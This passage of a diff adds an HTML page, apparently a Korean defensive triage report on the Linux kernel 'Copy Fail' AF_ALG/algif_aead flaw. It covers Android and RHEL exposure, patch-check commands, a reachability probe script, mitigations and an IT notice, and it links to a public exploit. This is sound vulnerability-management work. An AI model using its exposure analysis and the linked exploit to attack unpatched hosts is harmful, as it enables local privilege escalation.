+          <code>AF_ALG</code>가 열려 있지만 setuid 타깃이 없는 경우, file capability, privileged helper,
+          root copy/install flow, vendor debug path를 별도 조사한다.
+        </div>
+      </div>
+      <div class="decision">
+        <span class="label low">Lower Immediate Impact</span>
+        <div>
+          <code>AF_ALG</code> AEAD가 비활성화되어 있거나 seccomp/SELinux로 untrusted app에서 도달 불가하고,
+          privileged executable surface도 없으면 즉시 root exploit 가능성은 낮다.
+          그래도 upstream/vendor fix 추적은 유지한다.
+        </div>
+      </div>
+    </section>
+
+    <section class="section">
+      <h2>Android-Specific Risk Estimate</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>환경</th>
+            <th>Primitive 가능성</th>
+            <th>공개 PoC식 root 가능성</th>
+            <th>종합 판단</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Stock production Android</td>
+            <td><span class="label medium">기기/정책 의존</span></td>
+            <td><span class="label low">낮음</span></td>
+            <td>커널 패치 필요성은 남지만, setuid 기반 즉시 root는 낮게 본다.</td>
+          </tr>
+          <tr>
+            <td>OEM production with weak vendor helpers</td>
+            <td><span class="label medium">가능</span></td>
+            <td><span class="label medium">체인 의존</span></td>
+            <td>root copy, capability, privileged re-exec flow가 있으면 위험도가 올라간다.</td>
+          </tr>
+          <tr>
+            <td>Userdebug / eng build</td>
+            <td><span class="label medium">가능</span></td>
+            <td><span class="label medium">상대적으로 증가</span></td>
+            <td>debug feature, permissive 정책, su 잔존 여부에 따라 exploitability가 크게 변한다.</td>
+          </tr>
+          <tr>
+            <td>Rooted / custom ROM</td>
+            <td><span class="label medium">가능</span></td>
+            <td><span class="label high">환경에 따라 높음</span></td>
+            <td>Magisk/su/custom mount 정책 때문에 일반 Android 가정이 깨질 수 있다.</td>
+          </tr>
+          <tr>
+            <td>Android container / Linux userspace on Android</td>
+            <td><span class="label medium">가능</span></td>
+            <td><span class="label medium">구성 의존</span></td>
+            <td>proot/chroot/container가 실제 kernel syscall과 mount policy를 어떻게 노출하는지 확인해야 한다.</td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section class="section">
+      <h2>Recommended Patch Position</h2>
+      <p>
+        Android 커널 패치 검토에서는 다음 입장을 권장한다.
+      </p>
+      <ul>
+        <li>ARM/arm64 여부와 무관하게 취약 <code>algif_aead</code> 코드가 있으면 영향 후보로 포함한다.</li>
+        <li>공개 PoC가 stock Android에서 바로 root를 얻지 못한다는 이유만으로 “not affected” 처리하지 않는다.</li>
+        <li><code>AF_ALG</code> AEAD가 앱/shell/vendor context에서 도달 가능하면 패치 우선순위를 높인다.</li>
+        <li>Android kernel에서 <code>CONFIG_CRYPTO_USER_API_AEAD=n</code>이거나 앱/shell context에서 <code>socket(AF_ALG)</code>가 <code>EAFNOSUPPORT</code>로 막히면 공개 PoC 경로의 reachability는 낮다.</li>
+        <li><code>algif_aead</code>가 built-in이면 <code>modprobe.d</code>나 <code>rmmod</code> 기반 완화는 적용되지 않는다.</li>
+        <li>setuid 부재는 exploit impact를 낮추는 요소이지 kernel primitive 부재의 증거가 아니다.</li>
+        <li>OEM/vendor tree는 setuid보다 file capability, root copy helper, privileged re-exec flow를 더 집중적으로 본다.</li>
+      </ul>
+      <div class="callout">
+        <p>
+          최종 표현 예시:
+          “Android stock exploitability is reduced by absence of user-accessible setuid targets and platform sandboxing;
+          however ARM/arm64 Android kernels containing the affected algif_aead implementation may still expose the
+          underlying page-cache write primitive if AF_ALG AEAD is reachable. Apply upstream or equivalent vendor fix.”
+        </p>
+      </div>
+    </section>
+
+    <section class="section" id="enterprise">
+      <h2>Enterprise Linux 점검 방향</h2>
+      <p>
+        회사 엔터프라이즈 시스템에서는 “PoC가 실행되는가”보다 “패치 상태, AF_ALG 노출, 취약한 workload 위치,
+        공유 커널 환경 여부”를 우선 확인해야 한다. 특히 RHEL 계열은 <code>algif_aead</code>가 module이 아니라
+        kernel에 built-in일 수 있어 <code>lsmod</code>나 <code>rmmod</code>만으로 판단하면 안 된다.
+      </p>
+      <div class="callout risk">
+        <p>
+          Red Hat Security Data API 기준, 2026-04-30 확인 시점에 CVE-2026-31431은 Red Hat severity
+          <strong>Important</strong>, CVSS 3.1 <code>7.8</code>이며,
+          RHEL 8/9/10 <code>kernel</code>은 <strong>Affected</strong>로 표시된다.
+          RHEL 8/9의 <code>kernel-rt</code>도 <strong>Affected</strong>다.
+        </p>
+      </div>
+    </section>
+
+    <section class="section" id="rhel-matrix">
+      <h2>RHEL / Enterprise Matrix</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>플랫폼</th>
+            <th>Red Hat 상태</th>
+            <th>점검 우선순위</th>
+            <th>IT팀 확인 항목</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>RHEL 10 <code>kernel</code></td>
+            <td><span class="label high">Affected</span></td>
+            <td>높음</td>
+            <td>사용 중인 kernel NEVRA, Red Hat advisory/fix package, reboot 필요 여부, container host 여부 확인.</td>
+          </tr>
+          <tr>
+            <td>RHEL 9 <code>kernel</code></td>
+            <td><span class="label high">Affected</span></td>
+            <td>높음</td>
+            <td>일반 서버, bastion, CI runner, OpenShift/RKE/Kubernetes node, shared login host를 우선 점검.</td>
+          </tr>
+          <tr>
+            <td>RHEL 9 <code>kernel-rt</code></td>
+            <td><span class="label high">Affected</span></td>
+            <td>높음</td>
+            <td>실시간 커널 사용 장비는 일반 kernel과 별도 패치 트랙으로 확인. 운영 중단/재부팅 창 필요.</td>
+          </tr>
+          <tr>
+            <td>RHEL 8 <code>kernel</code></td>
+            <td><span class="label high">Affected</span></td>
+            <td>높음</td>
+            <td>legacy 서버와 장기 운영 노드를 우선 목록화. 단순 <code>yum update</code> 후에도 running kernel이 바뀌었는지 확인.</td>
+          </tr>
+          <tr>
+            <td>RHEL 8 <code>kernel-rt</code></td>
+            <td><span class="label high">Affected</span></td>
+            <td>높음</td>
+            <td>kernel-rt 패키지 보유 시스템은 별도 inventory를 뽑아야 한다.</td>
+          </tr>
+          <tr>
+            <td>RHEL 7 / 6</td>
+            <td><span class="label low">Not affected</span></td>
+            <td>낮음</td>
+            <td>공식 상태는 Not affected지만, EUS/ELS/custom kernel 또는 vendor kernel 사용 여부는 별도 확인.</td>
+          </tr>
+          <tr>
+            <td>Rocky / Alma / Oracle Linux</td>
+            <td><span class="label medium">벤더 추적 필요</span></td>
+            <td>높음</td>
+            <td>RHEL compatible kernel lineage를 쓰므로 각 벤더 advisory와 실제 running kernel package를 확인.</td>
+          </tr>
+          <tr>
+            <td>Ubuntu / Debian / SUSE / Arch</td>
+            <td><span class="label medium">벤더 추적 필요</span></td>
+            <td>높음</td>
+            <td>패치된 kernel로 부팅했는지 확인. rolling release는 kernel version만 보고 단정하지 말고 vendor changelog/advisory 확인.</td>
+          </tr>
+          <tr>
+            <td>Container hosts / Kubernetes nodes</td>
+            <td><span class="label high">공유 커널 위험</span></td>
+            <td>매우 높음</td>
+            <td>컨테이너 내부 unprivileged user가 host page cache를 통해 node compromise로 이어질 수 있는지 우선 검토.</td>
+          </tr>
+          <tr>
+            <td>CI runners / build farms</td>
+            <td><span class="label high">untrusted code 실행</span></td>
+            <td>매우 높음</td>
+            <td>PR/test job이 일반 user로 실행되는 self-hosted runner를 우선 격리 또는 패치.</td>
+          </tr>
+        </tbody>
+      </table>
+      <p class="small">
+        Red Hat 상태는 2026-04-30에 <code>https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2026-31431.json</code>
+        기준으로 확인했다. 이후 advisory/fix package 상태는 변할 수 있으므로 배포 전 재확인이 필요하다.
+      </p>
+    </section>
+
+    <section class="section" id="it-checklist">
+      <h2>IT팀 전달용 점검 체크리스트</h2>
+      <p>
+        아래 체크리스트는 운영팀이 자산 관리, 취약점 관리, 패치 실행, 예외 승인에 바로 사용할 수 있는 형태다.
+      </p>
+      <h3>1. 대상 자산 식별</h3>
+      <ul>
+        <li>Linux 서버 전체에서 OS, kernel package, running kernel, architecture, virtualization/container role을 수집한다.</li>
+        <li>RHEL 8/9/10, Rocky/Alma/Oracle Linux, Ubuntu/Debian/SUSE, Kubernetes/OpenShift node, self-hosted CI runner를 우선군으로 둔다.</li>
+        <li>인터넷 노출 여부보다 “local user 또는 untrusted workload 실행 여부”를 우선 위험 기준으로 둔다.</li>
+      </ul>
+      <pre><code>hostnamectl
+cat /etc/os-release
+uname -a
+rpm -q kernel kernel-core kernel-rt 2&gt;/dev/null || true
+dpkg -l 'linux-image*' 2&gt;/dev/null | grep '^ii' || true</code></pre>
+
+      <h3>2. RHEL 계열 패치 상태 확인</h3>
+      <pre><code># CVE가 현재 시스템에 적용 가능한지 확인
+sudo dnf updateinfo list --cve CVE-2026-31431 2&gt;/dev/null || sudo yum updateinfo list --cve CVE-2026-31431
+
+# 보안 업데이트 상세
+sudo dnf updateinfo info --cve CVE-2026-31431 2&gt;/dev/null || sudo yum updateinfo info --cve CVE-2026-31431
+
+# 사용 가능한 kernel 업데이트 확인
+sudo dnf check-update kernel kernel-core kernel-rt 2&gt;/dev/null || true</code></pre>
+      <p>
+        패키지를 설치한 뒤에도 <code>uname -r</code>이 여전히 이전 kernel이면 취약 kernel로 계속 실행 중이다.
+        kernel 패치는 대부분 재부팅이 완료되어야 적용된다.
+      </p>
+
+      <h3>3. Kernel crypto surface 확인</h3>
+      <pre><code># config 확인. 배포판별 경로가 다를 수 있다.
+grep -E 'CONFIG_CRYPTO_USER_API|CONFIG_CRYPTO_USER_API_AEAD|CONFIG_CRYPTO_AUTHENC' /boot/config-$(uname -r) 2&gt;/dev/null
+zcat /proc/config.gz 2&gt;/dev/null | grep -E 'CONFIG_CRYPTO_USER_API|CONFIG_CRYPTO_USER_API_AEAD|CONFIG_CRYPTO_AUTHENC'
+
+# algif/aead가 module인지 built-in인지 확인
+lsmod | grep -E 'algif|aead|authenc' || true
+modinfo algif_aead 2&gt;/dev/null || true
+
+# /proc/crypto 노출 시 알고리즘 존재 확인
+grep -A4 -E 'authencesn|authenc|cbc\\(aes\\)|hmac\\(sha256\\)' /proc/crypto 2&gt;/dev/null</code></pre>
+      <div class="callout warn">
+        <p>
+          <code>lsmod</code>에 <code>algif_aead</code>가 없다고 안전하다는 뜻은 아니다.
+          built-in이면 module list에 나오지 않고 <code>rmmod</code>도 통하지 않는다.
+        </p>
+      </div>
+
+      <h3>4. 비파괴 reachability 확인</h3>
+      <p>
+        운영 production에서 공개 exploit을 실행하지 않는다. 필요 시 소유한 테스트 시스템에서
+        <code>AF_ALG</code> socket 생성 가능 여부만 확인한다.
+      </p>
+      <pre><code>python3 - &lt;&lt;'PY'
+import socket
+try:
+    s = socket.socket(38, 5, 0)
+    s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+    print("AF_ALG AEAD reachable: investigate patch state immediately")
+except OSError as e:
+    print(f"AF_ALG AEAD not reachable from this context: {e}")
+PY</code></pre>
+      <p class="small">
+        이 확인은 “도달 가능성”만 본다. 패치 완료 여부의 대체 증거가 아니며, seccomp/SELinux context에 따라 결과가 달라질 수 있다.
+      </p>
+
+      <h3>5. 고위험 업무군 우선순위</h3>
+      <table>
+        <thead>
+          <tr>
+            <th>우선순위</th>
+            <th>시스템 유형</th>
+            <th>조치</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><span class="label high">P0</span></td>
+            <td>Kubernetes/OpenShift node, container host, self-hosted CI runner, shared shell host</td>
+            <td>즉시 패치 또는 untrusted workload 중지/격리. 재부팅 창 확보.</td>
+          </tr>
+          <tr>
+            <td><span class="label high">P1</span></td>
+            <td>개발 서버, bastion, jump host, batch worker, build server</td>
+            <td>24-72시간 내 패치. local user 접근권과 실행 가능한 workload 검토.</td>
+          </tr>
+          <tr>
+            <td><span class="label medium">P2</span></td>
+            <td>단일 tenant production app server</td>
+            <td>정기 긴급 패치 창에 포함. 웹 RCE 등과 chain 가능성을 고려.</td>
+          </tr>
+          <tr>
+            <td><span class="label low">P3</span></td>
+            <td>격리된 appliance, local user 없음, AF_ALG 차단 확인</td>
+            <td>벤더 패치 추적. 예외 승인 시 근거와 만료일 기록.</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h3>6. 완화책과 한계</h3>
+      <ul>
+        <li>최선 조치는 vendor kernel patch 적용 후 patched kernel로 재부팅하는 것이다.</li>
+        <li><code>algif_aead</code>가 loadable module이면 임시로 module loading을 차단할 수 있지만, built-in이면 효과가 없다.</li>
+        <li>컨테이너/CI 환경에서는 patch 여부와 별개로 seccomp로 <code>AF_ALG</code> socket 생성을 차단하는 정책을 검토한다.</li>
+        <li>공개 PoC 실행 후에는 page cache 상태가 남을 수 있으므로 production 검증에 사용하지 않는다.</li>
+        <li>파일 무결성 검사만으로는 page cache 변조를 탐지하기 어렵다. 디스크 내용이 아니라 메모리 cache가 바뀌는 모델이다.</li>
+      </ul>
+    </section>
+
+    <section class="section" id="it-notice">
+      <h2>IT팀 공지 초안</h2>
+      <p>
+        아래 문안은 내부 메일/티켓/Slack 공지에 맞춰 바로 다듬어 쓸 수 있다.
+      </p>
+      <pre><code>[Action Required] Linux kernel CVE-2026-31431 / Copy Fail 점검 및 패치
+
+대상:
+- RHEL 8/9/10 및 호환 배포판
+- Ubuntu/Debian/SUSE/Arch 등 Linux 서버
+- Kubernetes/OpenShift node, container host, self-hosted CI runner, shared login/build server
+
+위험:
+- local unprivileged user 또는 untrusted workload가 kernel AF_ALG/algif_aead 경로를 통해 page cache write primitive를 유발할 수 있음
+- 공개 PoC는 setuid binary를 이용하지만, 위험 평가는 PoC 성공 여부가 아니라 kernel patch/reachability 기준으로 수행 필요
+
+필수 조치:
+1. 각 서버의 OS, running kernel, installed kernel package를 수집
+2. vendor advisory에서 CVE-2026-31431 fix package 확인
+3. kernel update 적용 후 재부팅하여 uname -r 기준 patched kernel 실행 확인
+4. container/CI/shared host는 우선 패치 또는 untrusted workload 임시 격리
+5. production에서 공개 PoC 실행 금지
+
+RHEL 참고:
+- Red Hat Security Data API 기준 CVE-2026-31431은 Important, RHEL 8/9/10 kernel은 Affected로 표시됨
+- algif_aead가 built-in이면 rmmod/modprobe.d 완화가 동작하지 않을 수 있음</code></pre>
+    </section>
+
+    <section class="section" id="references">
+      <h2>References</h2>
+      <ul>
+        <li><a href="https://copy.fail/">Copy Fail — CVE-2026-31431</a></li>
+        <li><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py">Public PoC: copy_fail_exp.py</a></li>
+        <li><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/issues">Copy Fail GitHub issues</a></li>
+        <li><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/pull/25">PR #25: Make the exploit aarch64 compatible</a></li>
+        <li><a href="https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2026-31431.json">Red Hat Security Data API: CVE-2026-31431</a></li>
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31431">NVD: CVE-2026-31431</a></li>
+        <li><a href="https://source.android.com/docs/security/enhancements">Android Security Enhancements</a></li>
+        <li><a href="https://source.android.com/docs/core/architecture/kernel/android-common">Android Common Kernels</a></li>
+        <li><a href="https://source.android.com/docs/core/architecture/kernel/convert-or-add">Configure Kernel Features as GKI Modules</a></li>
+      </ul>
+      <p class="small">
+        Note: 이 문서는 공격 코드 작성 지침이 아니라 Android kernel patch triage와 방어적 취약성 평가를 위한 분석 문서다.
+      </p>
+    </section>
+  </main>
+
+  <footer>
+    copy_fail.html · Linux and Android exposure review · defensive analysis only
+  </footer>
+</body>
+</html>
